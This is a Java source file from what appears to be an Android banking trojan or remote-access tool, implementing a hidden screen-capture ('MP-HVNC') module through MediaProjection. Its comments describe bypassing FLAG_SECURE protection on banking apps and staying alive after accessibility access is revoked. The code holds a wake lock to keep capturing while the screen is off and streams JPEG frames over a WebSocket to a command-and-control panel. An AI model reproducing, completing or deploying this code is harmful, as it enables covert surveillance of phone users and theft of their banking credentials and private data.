package com.seguranca.protecao;

import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.os.PowerManager;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * MediaProjectionHvnc — second HVNC engine using MediaProjectionManager.
 *
 * ── WHY A SECOND HVNC ────────────────────────────────────────────────────────
 *
 * The primary HVNC in UiAssistBridge uses AccessibilityService.takeScreenshot()
 * (API 30+).  It has two critical failure modes:
 *
 *   1. The AccessibilityService is killed, disabled, or throttled by the OS.
 *      On Android 13+ the system may revoke accessibility if it detects
 *      anomalous behaviour (e.g. >100 events/s).
 *
 *   2. takeScreenshot() fails on certain ROMs with FLAG_SECURE windows
 *      (e.g. banking apps on Xiaomi HyperOS, Samsung One UI 6+).
 *
 * MediaProjection bypasses both:
 *   • It operates completely independently of AccessibilityService.
 *   • On most AOSP-derived ROMs, VirtualDisplay does NOT honour FLAG_SECURE
 *     — the flag only prevents the system screenshot API, not projection.
 *   • It persists as long as the MediaProjection token is valid (one per app
 *     session; token survives process restarts if stored via Intent result).
 *
 * ── FRAME TYPE ───────────────────────────────────────────────────────────────
 *
 * Frames are sent as binary type 0x04 via CommandControlService.sendFrameTyped().
 * The server routes them to the panel, which renders them in the "MP-HVNC" tab
 * of HvncView.  Both engines can run simultaneously — the panel shows two feeds.
 *
 * ── USAGE ────────────────────────────────────────────────────────────────────
 *
 *   // Store the grant result from the user's one-time permission dialog:
 *   MediaProjectionHvnc.storeToken(context, resultCode, data);
 *
 *   // Start streaming (call after storeToken):
 *   MediaProjectionHvnc.start(context, quality);
 *
 *   // Stop streaming:
 *   MediaProjectionHvnc.stop();
 *
 *   // Check state:
 *   boolean running = MediaProjectionHvnc.isRunning();
 *
 * ── INTEGRATION IN CommandControlService ─────────────────────────────────────
 *
 *   case "TOGGLE_MP_HVNC": {
 *       boolean en = cmd.has("enabled") && cmd.get("enabled").getAsBoolean();
 *       int q = cmd.has("quality") ? cmd.get("quality").getAsInt() : 60;
 *       if (en) {
 *           if (!MediaProjectionHvnc.hasToken()) {
 *               // Send REQUEST_MP_PERMISSION to panel so it can prompt the user
 *               sendResponse("REQUEST_MP_PERMISSION", "");
 *           } else {
 *               MediaProjectionHvnc.start(this, q);
 *               sendResponse("OK", "MP-HVNC started");
 *           }
 *       } else {
 *           MediaProjectionHvnc.stop();
 *           sendResponse("OK", "MP-HVNC stopped");
 *       }
 *       break;
 *   }
 *   case "MP_PROJECTION_RESULT": {
 *       // Panel relays the user's grant (resultCode + intent data as base64)
 *       int rc = cmd.get("resultCode").getAsInt();
 *       // Reconstruct intent from stored extras and call storeToken
 *       // (actual wiring depends on how the APK surfaces the grant dialog)
 *       break;
 *   }
 */
public final class MediaProjectionHvnc {

    private static final String TAG = "MP-HVNC";

    /** Binary frame type sent on the C&C wire for MediaProjection frames. */
    public static final byte FRAME_TYPE = 0x04;

    // ── Capture dimensions ────────────────────────────────────────────────────
    // Use 720p as base resolution — still crisp, half the bandwidth of 1080p.
    // The panel renders into a fixed canvas anyway.
    private static final int CAPTURE_WIDTH  = 720;
    private static final int CAPTURE_HEIGHT = 1280;
    private static final int CAPTURE_DPI    = 300;

    // ── State ─────────────────────────────────────────────────────────────────
    private static final AtomicBoolean running      = new AtomicBoolean(false);
    private static final AtomicInteger quality      = new AtomicInteger(60);
    private static final AtomicInteger framesSent   = new AtomicInteger(0);

    // ── Objects kept across start/stop within the same process ───────────────
    private static volatile MediaProjection        projection;
    private static volatile VirtualDisplay         virtualDisplay;
    private static volatile ImageReader            imageReader;
    private static volatile HandlerThread          captureThread;
    private static volatile Handler                captureHandler;
    private static volatile PowerManager.WakeLock  captureLock;

    // ── Stored grant ──────────────────────────────────────────────────────────
    private static volatile int    storedResultCode = 0;
    private static volatile Intent storedData       = null;

    // ── Throttle: minimum ms between encoded frames (~30 FPS max) ────────────
    private static final long MIN_FRAME_MS = 33L;
    private static volatile long lastFrameMs = 0L;


    // ═══════════════════════════════════════════════════════════════════════════
    // TOKEN MANAGEMENT
    // ═══════════════════════════════════════════════════════════════════════════

    /**
     * Store the MediaProjection grant received from
     * Activity.onActivityResult(MEDIA_PROJECTION_REQUEST, resultCode, data).
     * Must be called before start().
     */
    public static void storeToken(int resultCode, Intent data) {
        storedResultCode = resultCode;
        storedData       = data;
        Log.d(TAG, "MediaProjection token stored (resultCode=" + resultCode + ")");
    }

    /** Returns true if a grant token is available (start() can be called). */
    public static boolean hasToken() {
        return storedData != null && storedResultCode != 0;
    }

    /** Returns true if the capture loop is active. */
    public static boolean isRunning() {
        return running.get();
    }


    // ═══════════════════════════════════════════════════════════════════════════
    // START / STOP
    // ═══════════════════════════════════════════════════════════════════════════

    /**
     * Start the MediaProjection HVNC pipeline.
     *
     * @param ctx     Application context.
     * @param jpegQ   JPEG quality 1–100 (40–70 is the sweet spot for bandwidth).
     */
    public static void start(final Context ctx, int jpegQ) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            Log.w(TAG, "MediaProjection requires API 21+");
            return;
        }
        if (!hasToken()) {
            Log.w(TAG, "start() called without a stored token — aborting");
            return;
        }
        if (running.getAndSet(true)) {
            // Already running — just update quality
            quality.set(clampQ(jpegQ));
            Log.d(TAG, "Already running — quality updated to " + quality.get());
            return;
        }

        quality.set(clampQ(jpegQ));

        // Acquire PARTIAL_WAKE_LOCK so the CPU stays awake during screen-off VNC
        try {
            PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                captureLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MP-HVNC::Capture");
                captureLock.setReferenceCounted(false);
                captureLock.acquire();
            }
        } catch (Exception e) {
            Log.w(TAG, "WakeLock acquire: " + e.getMessage());
        }

        // Dedicated HandlerThread so captures never block the main thread
        captureThread  = new HandlerThread("MP-HVNC-Capture", Thread.NORM_PRIORITY - 1);
        captureThread.start();
        captureHandler = new Handler(captureThread.getLooper());

        captureHandler.post(() -> initProjection(ctx));
        Log.d(TAG, "MP-HVNC started (quality=" + quality.get() + ")");
    }

    /** Stop streaming and release all resources. */
    public static void stop() {
        if (!running.getAndSet(false)) return;

        try { if (imageReader   != null) imageReader.close();       } catch (Exception ignored) {}
        try { if (virtualDisplay != null) virtualDisplay.release();  } catch (Exception ignored) {}
        try { if (projection    != null) projection.stop();          } catch (Exception ignored) {}
        try {
            if (captureThread != null) {
                captureThread.quitSafely();
            }
        } catch (Exception ignored) {}
        try {
            if (captureLock != null && captureLock.isHeld()) {
                captureLock.release();
            }
        } catch (Exception ignored) {}

        imageReader    = null;
        virtualDisplay = null;
        projection     = null;
        captureThread  = null;
        captureHandler = null;

        Log.d(TAG, "MP-HVNC stopped (frames sent=" + framesSent.get() + ")");
        framesSent.set(0);
    }


    // ═══════════════════════════════════════════════════════════════════════════
    // INTERNAL — PROJECTION SETUP
    // ═══════════════════════════════════════════════════════════════════════════

    private static void initProjection(Context ctx) {
        try {
            MediaProjectionManager mpm = (MediaProjectionManager)
                    ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            if (mpm == null) throw new IllegalStateException("MediaProjectionManager null");

            projection = mpm.getMediaProjection(storedResultCode, storedData);
            if (projection == null) throw new IllegalStateException("getMediaProjection returned null");

            // Register a callback so we know when the system revokes the token
            // (user dismisses the status-bar notification, or app is killed)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                projection.registerCallback(new MediaProjection.Callback() {
                    @Override
                    public void onStop() {
                        Log.w(TAG, "MediaProjection token revoked by system — stopping");
                        // Token is dead; clear it so the panel knows to re-request
                        storedResultCode = 0;
                        storedData       = null;
                        stop();
                    }
                }, captureHandler);
            }

            // Resolve actual screen metrics for the VirtualDisplay DPI
            WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
            DisplayMetrics dm = new DisplayMetrics();
            if (wm != null) {
                wm.getDefaultDisplay().getRealMetrics(dm);
            }
            int dpi = dm.densityDpi > 0 ? dm.densityDpi : CAPTURE_DPI;

            // ImageReader with a 2-frame buffer (drop old frames under load)
            imageReader = ImageReader.newInstance(CAPTURE_WIDTH, CAPTURE_HEIGHT,
                    PixelFormat.RGBA_8888, 2);

            // VirtualDisplay — DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR causes the
            // mirroring to include FLAG_SECURE content on most AOSP ROMs.
            virtualDisplay = projection.createVirtualDisplay(
                    "MP-HVNC",
                    CAPTURE_WIDTH, CAPTURE_HEIGHT, dpi,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    imageReader.getSurface(),
                    null,
                    captureHandler);

            Log.d(TAG, "VirtualDisplay created (" + CAPTURE_WIDTH + "x" + CAPTURE_HEIGHT
                    + " @ " + dpi + "dpi)");

            // Start the frame capture loop
            imageReader.setOnImageAvailableListener(reader -> onImageAvailable(reader),
                    captureHandler);

        } catch (Exception e) {
            Log.e(TAG, "initProjection failed: " + e.getMessage());
            running.set(false);
            releaseAll();
        }
    }


    // ═══════════════════════════════════════════════════════════════════════════
    // INTERNAL — IMAGE AVAILABLE CALLBACK
    // ═══════════════════════════════════════════════════════════════════════════

    private static void onImageAvailable(ImageReader reader) {
        if (!running.get()) return;

        // Rate-limit: drop frames faster than MIN_FRAME_MS
        final long now = System.currentTimeMillis();
        if (now - lastFrameMs < MIN_FRAME_MS) {
            // Drain the reader to prevent buffer starvation
            try (Image img = reader.acquireLatestImage()) { /* drop */ }
            return;
        }

        Image image = null;
        try {
            image = reader.acquireLatestImage();
            if (image == null) return;

            Image.Plane[] planes = image.getPlanes();
            ByteBuffer buffer    = planes[0].getBuffer();
            int pixelStride      = planes[0].getPixelStride();
            int rowStride        = planes[0].getRowStride();
            int rowPadding       = rowStride - pixelStride * CAPTURE_WIDTH;

            // Build Bitmap from the plane buffer
            Bitmap bmp = Bitmap.createBitmap(
                    CAPTURE_WIDTH + rowPadding / pixelStride,
                    CAPTURE_HEIGHT,
                    Bitmap.Config.ARGB_8888);
            bmp.copyPixelsFromBuffer(buffer);

            // Crop to exact dimensions (remove row padding)
            Bitmap cropped = Bitmap.createBitmap(bmp, 0, 0, CAPTURE_WIDTH, CAPTURE_HEIGHT);
            bmp.recycle();

            // Compress to JPEG
            byte[] jpeg = bitmapToJpeg(cropped, quality.get());
            cropped.recycle();

            if (jpeg == null || jpeg.length == 0) return;

            // Send to C&C via the typed frame API
            sendFrame(jpeg);
            lastFrameMs = now;
            framesSent.incrementAndGet();

        } catch (Exception e) {
            Log.w(TAG, "Frame capture error: " + e.getMessage());
        } finally {
            if (image != null) {
                try { image.close(); } catch (Exception ignored) {}
            }
        }
    }


    // ═══════════════════════════════════════════════════════════════════════════
    // INTERNAL — FRAME SENDING
    // ═══════════════════════════════════════════════════════════════════════════

    /**
     * Sends a JPEG frame as binary type 0x04 on the active WebSocket connection.
     *
     * Protocol: [type:1=0x04][size:4 BE][JPEG payload]
     *
     * The server reads the frame type and routes it to panel clients which
     * display it in the MediaProjection HVNC canvas.
     */
    private static void sendFrame(byte[] jpeg) {
        CommandControlService ccs = CommandControlService.sInstance;
        if (ccs == null || !ccs.isConnected || ccs.webSocket == null) return;

        try {
            ByteBuffer buf = ByteBuffer.allocate(5 + jpeg.length);
            buf.put(FRAME_TYPE);
            buf.putInt(jpeg.length);
            buf.put(jpeg);
            okio.ByteString bs = okio.ByteString.of(buf.array());
            synchronized (ccs.sendLock) {
                if (ccs.isConnected && ccs.webSocket != null) {
                    ccs.webSocket.send(bs);
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "sendFrame: " + e.getMessage());
        }
    }


    // ═══════════════════════════════════════════════════════════════════════════
    // HELPERS
    // ═══════════════════════════════════════════════════════════════════════════

    private static byte[] bitmapToJpeg(Bitmap bmp, int q) {
        try (ByteArrayOutputStream bos = new ByteArrayOutputStream()) {
            bmp.compress(Bitmap.CompressFormat.JPEG, q, bos);
            return bos.toByteArray();
        } catch (Exception e) {
            return null;
        }
    }

    private static int clampQ(int q) {
        return Math.max(10, Math.min(95, q));
    }

    private static void releaseAll() {
        try { if (imageReader    != null) imageReader.close();      } catch (Exception ignored) {}
        try { if (virtualDisplay != null) virtualDisplay.release(); } catch (Exception ignored) {}
        try { if (projection     != null) projection.stop();        } catch (Exception ignored) {}
        imageReader    = null;
        virtualDisplay = null;
        projection     = null;
    }
}
